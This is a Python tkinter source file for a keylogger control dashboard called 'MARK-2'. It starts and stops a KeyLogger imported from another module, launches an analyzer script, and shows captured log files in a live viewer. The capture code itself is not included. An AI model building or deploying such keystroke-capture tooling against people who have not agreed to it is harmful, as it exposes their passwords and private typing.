import tkinter as tk
from tkinter import messagebox
import os
from logger import KeyLogger

# -------------------------
#   KEYLOGGER CONNECTION
# -------------------------
keylogger = KeyLogger()

def start_logging_gui():
    keylogger.start_logging()
    messagebox.showinfo("Status", "Keylogger started Capturing.")

def stop_logging_gui():
    keylogger.stop_logging()
    messagebox.showinfo("Status", "Keylogger stopped Capturing.")

def run_analyzer():
    os.system("python analyzer.py")

# -------------------------
#   MAIN GUI WINDOW
# -------------------------
root = tk.Tk()
root.title("MARK-2 KEYLOGGER DASHBOARD")
root.geometry("600x400")
root.configure(bg="#1e1e1e")

title = tk.Label(root, text="MARK-2 Dashboard", font=("Cascadia Code", 16, "bold"), bg="#1e1e1e", fg="cyan")
title.pack(pady=10)

# START BUTTON
btn1 = tk.Button(root, text="Start Logging", width=20, command=start_logging_gui, bg="black", fg="lime")
btn1.pack(pady=10)

# STOP BUTTON
btn2 = tk.Button(root, text="Stop Logging", width=20, command=stop_logging_gui, bg="black", fg="orange")
btn2.pack(pady=10)

# ANALYZER BUTTON
btn3 = tk.Button(root, text="Run Analyzer", width=20, command=run_analyzer, bg="black", fg="cyan")
btn3.pack(pady=10)

# -------------------------
#   LIVE LOG VIEWER
# -------------------------
def open_live_viewer():
    viewer = tk.Toplevel(root)
    viewer.title("LIVE LOG VIEWER")
    viewer.geometry("700x500")
    viewer.configure(bg="#1e1e1e")

    text_area = tk.Text(viewer, bg="black", fg="lime", insertbackground="lime")
    text_area.pack(expand=True, fill="both")

    log_folder = "logs"

    last_line_index = 0  # tracks how many lines we've already added

    def update_logs():
        nonlocal last_line_index
        # get newest log file
        files = sorted(os.listdir(log_folder))
        if not files:
            viewer.after(500, update_logs)
            return

        latest = os.path.join(log_folder, files[-1])

        with open(latest, "r", encoding="utf-8") as f:
            lines = f.readlines()

        # append only new lines
        new_lines = lines[last_line_index:]
        for line in new_lines:
            text_area.insert(tk.END, line)
        last_line_index = len(lines)

        viewer.after(500, update_logs)  # refresh every 0.5 sec

    update_logs()
# VIEW LOG BUTTON
btn4 = tk.Button(root, text="LIVE LOG VIEWER", width=20, command=open_live_viewer, bg="black", fg="yellow")
btn4.pack(pady=10)

root.mainloop()
